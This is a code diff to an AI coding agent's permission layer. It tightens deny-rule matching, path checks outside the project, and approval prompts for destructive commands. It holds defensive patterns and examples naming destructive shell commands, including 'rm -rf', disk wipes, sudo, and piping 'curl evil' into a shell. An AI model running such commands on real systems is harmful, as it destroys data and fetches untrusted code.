@@ -884,11 +884,7 @@ def _stopped_early(final: str) -> bool:
     return bool(_PROMISE.search(last_sentence))
 
 
-_DESTRUCTIVE = re.compile(
-    r"(\brm\s+(-[a-zA-Z]*[rf][a-zA-Z]*\s+|--recursive|--force)|\bgit\s+(push\s+.*(--force|-f\b|--delete)|reset\s+--hard|clean\s+-[a-z]*f|branch\s+-D|checkout\s+--\s|checkout\s+\.(\s|$)|restore\s+(--\S+\s+)*\.(\s|$)|worktree\s+remove\s+.*(-f\b|--force)|stash\s+(drop|clear))"
-    r"|\bdd\s+if=|\b(mkfs|shred|wipefs|fdisk|diskutil\s+erase)\b|\b(curl|wget)\b[^|;&]*\|\s*(sudo\s+)?(ba|z|fi)?sh\b"
-    r"|\bchmod\s+-R\s+777|\bsudo\b|>\s*/dev/sd|\bdrop\s+(table|database)\b|\bformat\s+[a-z]:|\bRemove-Item\b.*-Recurse|\bdel\s+/[sq]\b|\brmdir\s+/s\b)",
-    re.I)
+_DESTRUCTIVE = PR.DESTRUCTIVE                   # shared with re-check on edit (core/tools.py _recheckable)
 
 
 def _rules(root) -> dict:
@@ -916,11 +912,33 @@ def _rules(root) -> dict:
 _CHAIN = re.compile(r"&&|\|\||[;|\n]|(?<![>&\d])&(?![&>])")
 
 
-def _bash_segments_match(cmd: str, pattern: str) -> bool:
+_ASSIGN = re.compile(r"""^(?:env\s+)?(?:[A-Za-z_]\w*=(?:'[^']*'|"[^"]*"|\S*)\s+)+|^env\s+""")
+
+
+def _deny_forms(part: str) -> list[str]:
+    """One command as a deny rule sees it: as written, without leading VAR=x assignments (and `env`), and with the
+    program's folder dropped (/usr/bin/curl is curl)."""
+    out = [part]
+    bare = _ASSIGN.sub("", part).strip()
+    out.append(bare)
+    first, _, rest = bare.partition(" ")
+    if "/" in first:
+        out.append((first.rsplit("/", 1)[-1] + " " + rest).strip())
+    return out
+
+
+def _bash_segments_match(cmd: str, pattern: str, deny: bool = False) -> bool:
     """A "bash:" rule matches only when every part of a chained command (; && || | & or a new line) matches the
-    pattern, and never a command with a substitution: "bash:npm test*" must not allow "npm test; curl evil | sh"."""
+    pattern, and never a command with a substitution: "bash:npm test*" must not allow "npm test; curl evil | sh".
+    deny=True (a deny rule): any part matching is enough, a substitution ($(...), backticks, <(...)) always counts
+    as a match since what it runs cannot be read, and `X=1 curl ...` is matched as `curl ...`."""
     import fnmatch
     cmd = cmd.strip()
+    if deny:
+        if re.search(r"\$\(|`|[<>]\(", cmd):
+            return True
+        parts = [x.strip() for x in _CHAIN.split(cmd) if x.strip()] + [cmd]
+        return any(fnmatch.fnmatchcase(f, pattern) for x in parts for f in _deny_forms(x))
     if "$(" in cmd or "`" in cmd:
         return False
     parts = [x.strip() for x in _CHAIN.split(cmd) if x.strip()]
@@ -1002,20 +1020,24 @@ def _rule_hit(rules: list, name: str, args: dict, deny: bool = False) -> str:
     for r in rules:
         if r.startswith("bash:"):
             if deny:                                  # a deny rule hits when any part of a chained command matches
-                if any(_bash_segments_match(x, r[5:].strip()) for c in cmds for x in _CHAIN.split(c) + [c]):
+                if any(_bash_segments_match(x, r[5:].strip(), deny=True) for c in cmds for x in _CHAIN.split(c) + [c]):
                     return r
             elif cmds and not any(PR.writes(c) for c in cmds) and \
                     all(_bash_segments_match(c, r[5:].strip()) for c in cmds):
                 return r                              # an allow rule never covers a command that redirects output
-        elif fnmatch.fnmatchcase(name, r) or fnmatch.fnmatchcase(name.replace("-", "_"), r):
-            return r
+        elif fnmatch.fnmatchcase(name, r) or fnmatch.fnmatchcase(name.replace("-", "_"), r) or \
+                name.replace("-", "_") in PR.TOOL_FAMILY.get(r.strip().lower(), ()):
+            return r                                  # "bash" also names shell, "edit" also apply_patch (the lean tools)
     return ""
 
 
 def _destructive(args: dict) -> bool:
-    """A shell command that deletes recursively, rewrites history, wipes a disk, pipes the web into a shell or uses sudo."""
-    return bool(_DESTRUCTIVE.search(str(args.get("command") or args.get("cmd") or "")
-                                    + " " + " ".join(map(str, args.get("commands") or []))))
+    """A shell command that deletes recursively, rewrites history, wipes a disk, pipes the web into a shell or uses sudo.
+    shell's argv list (["rm", "-rf", "build"], ["bash", "-lc", "git reset --hard"]) is read as the script it runs."""
+    cmd = args.get("command") or args.get("cmd") or ""
+    if isinstance(cmd, (list, tuple)):
+        cmd = T.shell_script(cmd)
+    return bool(_DESTRUCTIVE.search(str(cmd) + " " + " ".join(map(str, args.get("commands") or []))))
 
 
 _CHAT_TOOLS = frozenset({"read_file", "grep", "glob", "edit", "write_file", "bash", "web_search", "web_research",
@@ -1808,10 +1830,11 @@ class Agent:
             self._plan_needed = False
         else:
             self._plan_start(route, g)
+        # re-check on edit (core/tools.py _recheck) follows the chat's lane on every turn: a resumed chat, or one whose
+        # first message was not in Codex style, gets it too (and a chat that left the lean lane stops it)
+        self.ws.recheck = bool(cx) and self._lean()
         if cx and len(self.messages) <= 2:           # the route's method rides on the first message (hrouter)
             extra = self._codex_env()
-            if self._lean():
-                self.ws.recheck = True                 # re-check on edit (core/tools.py _recheck)
             if self._lean() and os.environ.get("MH_PRELOAD", "1") != "0" and not getattr(self.ws, "container", None):
                 try:                                 # the files, git state and source up front (agent/preload.py)
                     from meshpool_harness.agent import preload as _PL
@@ -1889,6 +1912,7 @@ class Agent:
                     msg, streamed = self._chat(turn)
                 finally:
                     self._no_tools = False
+                native = bool(msg.get("tool_calls"))
                 msg = self._text_tools(msg)             # a model without tool calling asks for tools in text (W-02)
                 if not tools_off and not msg.get("tool_calls"):
                     from meshpool_harness.core import textcalls as _TC
@@ -1908,7 +1932,10 @@ class Agent:
                             self.emit({"type": "stream_reset"})
                             streamed = False
                 cut_off = self._finish == "length"     # the reply hit the output limit (max_tokens)
-                cut = {i for i, c in enumerate(msg.get("tool_calls") or []) if cut_off and not _args_ok(c)}
+                # a call read from the reply's text has well-formed arguments even when the text stopped mid-way (an
+                # unclosed <tool_call> or <parameter=content> up to the end): after a cut-off none of them is run
+                cut = {i for i, c in enumerate(msg.get("tool_calls") or [])
+                       if cut_off and (not native or not _args_ok(c))}
                 calls = _sanitize_calls(msg.get("tool_calls") or [])
                 cut = {calls[i]["id"] for i in cut}
                 for c in calls:                        # a call without a name makes every later request invalid
@@ -2821,7 +2848,7 @@ class Agent:
         solve rate). The runaway budget above only sees steps that change nothing; a run of distinct probes that all
         succeed (final21: 34-43 steps on regex-redos and window-median, where Codex took 9-18) is invisible to it. At
         MH_STEP_NOTE tool steps (off until measured; 14 is the candidate) the model is told where it stands; at twice that, to finish; at MH_STEP_WRAP
-        (default 40) tools go off. 0 turns it off."""
+        tool steps (off by default, 0; 40 is the candidate) tools go off. 0 turns either one off."""
         if not self._lean():
             return ""
         try:
@@ -3994,6 +4021,20 @@ class Agent:
     def _outside(self, name: str, args: dict) -> str:
         """Why a read-only call still needs a yes in Ask and Accept edits: it reads outside the project
         (an SSH key, another app's secrets), or a web fetch carries a lot of data out in its address. "" if fine."""
+        n = name.replace("-", "_")
+        if n == "office_task" or n.startswith(self._OFFICE_MCP):
+            # the office engines and the office server read the files they are given, ~ and relative to the project,
+            # without asking (office_task is in READ_ONLY, read_document in SAFE_MCP): the same check delegate.py runs
+            keys = ("files",) if n == "office_task" else self._OFFICE_PATH_KEYS
+            vals = []
+            for k in keys:
+                v = args.get(k)
+                vals += [str(x) for x in (v if isinstance(v, list) else [v]) if isinstance(x, str) and x.strip()]
+            for v in vals:
+                why = self._outside_path(os.path.expanduser(v.strip()))
+                if why:
+                    return why
+            return ""
         if name in ("read_file", "grep"):
             p = os.path.expanduser(str(args.get("path") or "."))
         elif name == "glob":
@@ -4017,11 +4058,21 @@ class Agent:
             p = os.path.expanduser(p)
         else:
             return ""
+        return self._outside_path(p)
+
+    _OFFICE_MCP = "mcp__meshpool_office__"
+    _OFFICE_PATH_KEYS = ("path", "paths", "file", "files", "file_path", "filename", "to", "deck")
+
+    def _outside_path(self, p: str) -> str:
+        """"" for a path (~ already expanded; relative to the project) inside the project, this chat's own tool output
+        or the files the user attached; else the question to ask. Never other chats' histories."""
+        if re.match(r"^[A-Za-z]:(?![\\/])", p) or (os.name != "nt" and (re.match(r"^[A-Za-z]:[\\/]", p)
+                                                                         or p.startswith("\\\\"))):
+            return f"Read {p[:120]} (outside the project)?"     # a drive or UNC path is never inside here
         try:
             q = Path(p).resolve() if os.path.isabs(p) else (self.ws.root / p).resolve()
         except (OSError, ValueError):
             return f"Read {p[:80]} (outside the project)?"
-        # the project, this chat's own tool output and the files the user attached; never other chats' histories
         ok = [self.ws.root, self.dir.resolve(), (C.runs_dir() / "_uploads").resolve()]
         return "" if any(q == r or r in q.parents for r in ok) else f"Read {str(q)[:120]} (outside the project)?"
 
@@ -4064,19 +4115,22 @@ class Agent:
         hk = EX.run_hooks_full(self.root, "PreToolUse", {}, tool=name, args=args)
         if hk["blocked"]:
             return False, f"Blocked by a hook: {hk['message']}"
-        if hk["allow"] and not _destructive(args):
-            return True, ""
         rules = _rules(self.root)
         hit = _rule_hit(rules["deny"], name, args, deny=True)
-        if hit:
-            return False, f"Not allowed by your saved rule {hit!r} (permissions.json). Do something else, or ask the user to change the rule."
+        if hit:                                # read before a hook's allow: a hook never overrides a saved deny
+            subst = hit.startswith("bash:") and any(re.search(r"\$\(|`|[<>]\(", c) for c in PR.commands_of(name, args))
+            return False, (f"Not allowed by your saved rule {hit!r} (permissions.json). Do something else, or ask the user to change the rule."
+                           + (" While a bash deny rule is saved, no command with $(...), backticks or <(...) runs: "
+                              "run its parts as separate plain commands." if subst else ""))
+        if hk["allow"] and not _destructive(args):
+            return True, ""
         if _rule_hit(rules["allow"], name, args) and not _destructive(args):
             return True, ""
         risky = self._outside(name, args) if self.mode != "auto" else ""
         if self.mode == "auto" and _destructive(args):        # OSS-18: Full access still asks about these ...
-            if _rule_hit(rules["allow"], name, args):
-                return True, ""                               # ... unless the user allowlisted this command
-            risky = risky or "destructive"
+            if _rule_hit([r for r in rules["allow"] if r.startswith("bash:")], name, args):
+                return True, ""          # ... unless the user allowlisted this command ("bash:rm -rf build*"; a bare
+            risky = risky or "destructive"                    # "bash" or --allowed-tools bash allows the tool, not this)
         if not risky and (self.mode == "auto" or name in READ_ONLY or name.replace("-", "_") in SAFE_MCP):
             return True, ""
         if self.mode == "edits" and name in ("edit", "write_file", "apply_patch", "notebook_edit"):
@@ -4100,7 +4154,11 @@ class Agent:
             return True, ""                    # a chat grant never covers a destructive command (OSS-18)
         if not self.approve:
             return False, "No one is available to approve this. Run with --auto to allow changes."
-        if risky:
+        if risky == "destructive":             # the command itself, as the other command cards show it
+            shown = PR.commands_of(name, args) or [str(args.get("command") or args.get("cmd") or "")]
+            wd = f"cd {args['workdir']} && " if name == "shell" and args.get("workdir") else ""
+            kind, title, detail = "bash", "Run this destructive command?", wd + "\n".join(shown)
+        elif risky:
             kind, title, detail = "read", risky, json.dumps(args, indent=1, ensure_ascii=False)[:3000]
         elif name == "bash":
             kind, title, detail = "bash", "Run this command?", args.get("command", "")
@@ -4137,6 +4195,9 @@ class Agent:
                  "all file edits" if group == "edit" else "this tool" if group != "bash" else
                  " and ".join(f"`{p}`" for p in pats[:3]) + " commands" if pats else "once")   # once: no chat grant
         decision, note = PR.approve_with_scope(self.approve, kind, title, detail, scope)
+        if decision in ("yes", "always"):      # re-check on edit never runs a command again that needed this yes
+            self.ws.__dict__.setdefault("asked_cmds", set()).update(
+                c.strip() for c in PR.commands_of(name, args) if c.strip())
         if decision == "always" and scope != "once":
             if group == "bash":
                 self.always.update("bash:" + p for p in pats)   # no pattern (a chain, a redirect): this once only
